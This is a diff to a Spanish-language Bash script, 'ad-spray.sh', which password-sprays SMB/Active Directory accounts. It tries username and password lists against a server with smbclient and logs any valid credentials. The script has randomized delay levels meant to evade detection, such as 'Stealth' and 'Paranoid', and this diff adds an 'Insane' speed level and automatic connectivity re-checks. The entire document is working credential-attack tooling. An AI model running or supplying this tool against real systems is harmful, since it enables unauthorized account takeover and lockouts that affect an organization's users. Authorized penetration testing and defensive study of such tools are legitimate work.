@@ -14,11 +14,12 @@ NF="\e[0m"           # Normal format
 
 # Variables globales
 SCRIPT_NAME="ad-spray.sh"
-VERSION=1.1
+VERSION=1.2
 COMMAND="smbclient"
 SMB_PORT="445"
 LOG_FILE=""
-SLEEP_SCALE=2 # Valor por defecto
+SLEEP_SCALE=2 # Valor por defecto de -t
+MAX_COUNTER_CONNECT=10
 TOTAL_PASSWORDS=0
 TOTAL_USERS=0
 TOTAL_COMBINATIONS=0
@@ -47,17 +48,16 @@ function usage() {
     echo -e "      ${Y}-p${NF}    Una única contraseña"
     echo -e "      ${Y}-s${NF}    Servidor SMB (por ejemplo, 192.168.1.10)"
     echo -e "      ${Y}-d${NF}    Dominio (opcional)"
-    echo -e "      ${Y}-t${NF}    Nivel de tiempo (1: Paranoid, 2: Stealth (por defecto), 3: Fast, 4: More fast)"
+    echo -e "      ${Y}-t${NF}    Nivel de agresividad (1: Paranoid, 2: Stealth (por defecto), 3: Fast, 4: More fast, 5: Insane)"
     echo -e "      ${Y}-h${NF}    Muestra la ayuda."
     exit 1
 }
 
 
-# Check si smbclient está instalado
+# Comprobar si smbclient está instalado
 function smbclient_checker() {
     if ! [ -x "$(command -v $COMMAND)" ]; then
         {
-            banner
             echo -e "\n${Y}  [!]${NF} Debe instalar ${G}$COMMAND${NF} para poder utilizar ${G}$SCRIPT_NAME ${NF}" 
             echo -e "${B}  [i]${NF} Intente instalar con: \n"
             echo -e "${R}     $(whoami 2>/dev/null)@$(hostname 2>/dev/null):${C}~${NF}$ sudo apt install $COMMAND"
@@ -68,15 +68,58 @@ function smbclient_checker() {
 
 
 # Comprobar conectividad
-function connect_checker() {
+function port_checker() {
     local host=$1
     local port=$2
 
-    if ! timeout 1 bash 2>/dev/null -c "</dev/tcp/$host/$port " ; then 
-        banner
-        echo -e "${Y}  [!]${NF} No hay conectividad con el servidor SMB${C} $host:$port ${NF}\n" 
-        exit 1
-    fi    
+    if timeout 1 bash 2>/dev/null -c "</dev/tcp/$host/$port " ; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+
+# Reportar estado de conectividad
+function connect_checker() {
+    local host=$1
+    local port=$2
+    local opt=$3
+
+    case "$opt" in
+        init_check) 
+            echo -e "${B}  [i]${NF} Chequeando conectividad con el servidor SMB${C} $host:$port ${NF}"
+            if port_checker $SERVER $SMB_PORT; then
+                echo -e "${G}  [i]${NF} Ok, continuando ...\n"
+            else
+                echo -e "${Y}  [!]${NF} No hay conectividad con el servidor SMB. \n"
+                exit 1
+            fi 
+        ;;
+        auto_check) 
+            ((counter++))
+            if (( counter >= MAX_COUNTER_CONNECT )); then
+                counter=0
+                while true; do
+                    echo -e "${B}  [i]${NF} Chequeando conectividad con el servidor SMB${C} $host:$port ${NF}"
+                    if port_checker $SERVER $SMB_PORT; then
+                        echo -e "${G}  [i]${NF} Ok, continuando ...\n"
+                        break
+                    else
+                        echo -e "${Y}  [!]${NF} No hay conectividad con el servidor SMB. \n"
+                        echo -e "${B}  [i]${NF} Presione una Enter o Espacio para reintentar o CTRL+C para cancelar.\n"
+                            while true; do
+                                read -sn 1  KEY < /dev/tty
+                                if [[ $KEY = '' ]]; then 
+                                    echo -e "${B}  [+]${NF} Reintentando... \n"
+                                    break
+                                fi
+                            done
+                    fi
+                done
+            fi
+        ;;
+    esac
 }
 
 
@@ -101,7 +144,6 @@ function write_log() {
     local event=$1
     shift
     local message="$*"
-
     case "$event" in
         ini)
             echo "#############################################################################" >> "$LOG_FILE"
@@ -131,7 +173,8 @@ function random_sleep() {
         1) min=21; max=60 ;; # Paranoid
         2) min=11; max=20 ;; # Stealth
         3) min=5;  max=10  ;; # Fast
-        4) min=0;  max=2  ;; # More fast
+        4) min=1;  max=4  ;; # More fast
+        5) min=0;  max=1  ;; # Insane
         *) min=11; max=20 ;; # Default (Stealth)
     esac
     local sleep_time=$(shuf -i "$min-$max" -n 1)
@@ -140,7 +183,7 @@ function random_sleep() {
 }
 
 
-# Función para rastrear estadísticas
+# Rastrear estadísticas
 function track_stats() {
     local type=$1
     local users_file=$2
@@ -161,29 +204,24 @@ function track_stats() {
 # Validar parámetros
 function validate_parameters() {
     if [[ -z "$SERVER" || (-z "$USERS_FILE" && -z "$SINGLE_USER") || (-z "$PASSWORDS_FILE" && -z "$SINGLE_PASSWORD") ]]; then
-        banner
         echo -e "${Y}  [!]${NF} Error: Parámetros faltantes. \n"
         usage
     fi
 
     if [[ -n "$USERS_FILE" && -n "$SINGLE_USER" ]]; then
-        banner
         echo -e "${Y}  [!]${NF} Error: No se puede usar -U y -u al mismo tiempo. \n"
         usage
     fi
     if [[ -n "$PASSWORDS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
-        banner
         echo -e "${Y}  [!]${NF} Error: No se puede usar -P y -p al mismo tiempo. \n"
         usage
     fi
 
     if [[ -n "$USERS_FILE" && ! -f "$USERS_FILE" ]]; then
-        banner
         echo -e "${Y}  [!]${NF} Error: Archivo de usuarios no encontrado: $USERS_FILE"
         exit 1
     fi
     if [[ -n "$PASSWORDS_FILE" && ! -f "$PASSWORDS_FILE" ]]; then
-        banner
         echo -e "${Y}  [!]${NF} Error: Archivo de contraseñas no encontrado: $PASSWORDS_FILE"
         exit 1
     fi
@@ -199,9 +237,7 @@ function test_credentials() {
 
     track_stats combinations
 
-    # Ajustar el dominio si es "default"
     [[ "$domain" == "default" ]] && domain=""
-
     if $COMMAND -L "$server" -U "$user%$password" ${domain:+-W "$domain"} &>/dev/null; then
         echo -e "${G}  [!]${NF} Credenciales válidas: $user:$password \n"
         write_log message "[!] Credenciales válidas: $user:$password"
@@ -214,14 +250,14 @@ function test_credentials() {
 }
 
 
-# Elimina los retorno de carro de archivos creados en Windows
+# Eliminar los retorno de carro de archivos creados en Windows
 function normalize_files() {
     local file=$1
     sed -i 's/\r$//' "$file" 2>/dev/null
 }
 
 
-# Procesa una lista de usuarios y una lista de contraseñas
+# Procesar una lista de usuarios y una lista de contraseñas
 function process_users_and_passwords() {
     local users_file=$1
     local passwords_file=$2
@@ -239,13 +275,14 @@ function process_users_and_passwords() {
             echo -e "     - Usuario: $Y$user$NF"
             echo -e "     - Contraseña: $Y$password$NF\n"
             test_credentials "$user" "$password" "$server" "$domain"
+            connect_checker "$SERVER" "$SMB_PORT" "auto_check"
             random_sleep
         done < "$users_file"
     done < "$passwords_file"
 }
 
 
-# Procesa un usuario único y una lista de contraseñas
+# Procesar un usuario único y una lista de contraseñas
 function process_single_user_and_passwords() {
     local user=$1
     local passwords_file=$2
@@ -253,19 +290,19 @@ function process_single_user_and_passwords() {
     local domain=$4
 
     normalize_files "$passwords_file"
-
     while IFS= read -r password; do
         [[ -z "$password" ]] && continue
         echo -e "${B}  [i]${NF} Probando ..."
         echo -e "     - usuario:$Y $user $NF"
         echo -e "     - contraseña:$Y $password $NF\n"
         test_credentials "$user" "$password" "$server" "$domain"
+        connect_checker "$SERVER" "$SMB_PORT" "auto_check"
         random_sleep
     done < "$passwords_file"
 }
 
 
-# Procesa una lista de usuarios y una contraseña única
+# Procesar una lista de usuarios y una contraseña única
 function process_users_and_single_password() {
     local users_file=$1
     local password=$2
@@ -280,12 +317,13 @@ function process_users_and_single_password() {
         echo -e "     - usuario:$Y $user $NF"
         echo -e "     - contraseña:$Y $password $NF\n"
         test_credentials "$user" "$password" "$server" "$domain"
+        connect_checker "$SERVER" "$SMB_PORT" "auto_check"
         random_sleep
     done < "$users_file"
 }
 
 
-# Procesa un usuario único y una contraseña única
+# Procesar un usuario único y una contraseña única
 function process_single_user_and_password() {
     local user=$1
     local password=$2
@@ -296,14 +334,12 @@ function process_single_user_and_password() {
     echo -e "     - usuario:$Y $user $NF"
     echo -e "     - contraseña:$Y $password $NF\n"
     test_credentials "$user" "$password" "$server" "$domain"
-    random_sleep
 }
 
 
 # Procesar combinaciones
 function process_combination() {
     if [[ -n "$USERS_FILE" && -n "$PASSWORDS_FILE" ]]; then
-        banner
         write_log ini
         track_stats user "$USERS_FILE"
         track_stats password "$PASSWORDS_FILE"
@@ -311,7 +347,6 @@ function process_combination() {
         report_stats
         write_log fin
     elif [[ -n "$SINGLE_USER" && -n "$PASSWORDS_FILE" ]]; then
-        banner
         write_log ini
         track_stats suser
         track_stats password "$PASSWORDS_FILE"
@@ -319,7 +354,6 @@ function process_combination() {
         report_stats
         write_log fin
     elif [[ -n "$USERS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
-        banner
         write_log ini
         track_stats user "$USERS_FILE"
         track_stats spass
@@ -327,7 +361,6 @@ function process_combination() {
         report_stats
         write_log fin
     elif [[ -n "$SINGLE_USER" && -n "$SINGLE_PASSWORD" ]]; then
-        banner
         write_log ini
         track_stats suser
         track_stats spass
@@ -335,7 +368,6 @@ function process_combination() {
         report_stats
         write_log fin
     else
-        banner
         echo -e "${Y}  [!]${NF} Error: Combinación de parámetros no válida."
         usage
         exit 1
@@ -362,7 +394,7 @@ function report_stats() {
 
 ## Main
 
-# Check smbclient
+banner
 smbclient_checker
 
 # Parseo de parámetros
@@ -374,16 +406,20 @@ while getopts "U:u:P:p:s:d:t:h" opt; do
         p) SINGLE_PASSWORD="$OPTARG" ;;
         s) SERVER="$OPTARG" ;;
         d) DOMAIN="$OPTARG" ;;
-        t) SLEEP_SCALE="$OPTARG" ;;
+        t) SLEEP_SCALE="$OPTARG" 
+            if ! [[ "$SLEEP_SCALE" =~ ^[1-5]$ ]]; then
+                echo -e "\n${Y}  [!]${NF} Error: El valor de -t debe estar entre 1 y 5."
+                banner
+                usage
+            fi ;;
         h) banner ; usage ;;
         *) banner ; usage ;;
     esac
 done
 
-# Configurar archivo de log
 DOMAIN=${DOMAIN:-"default"}
 LOG_FILE="spray_${DOMAIN}.log"
 
 validate_parameters
-connect_checker $SERVER $SMB_PORT
+connect_checker $SERVER $SMB_PORT init_check
 process_combination
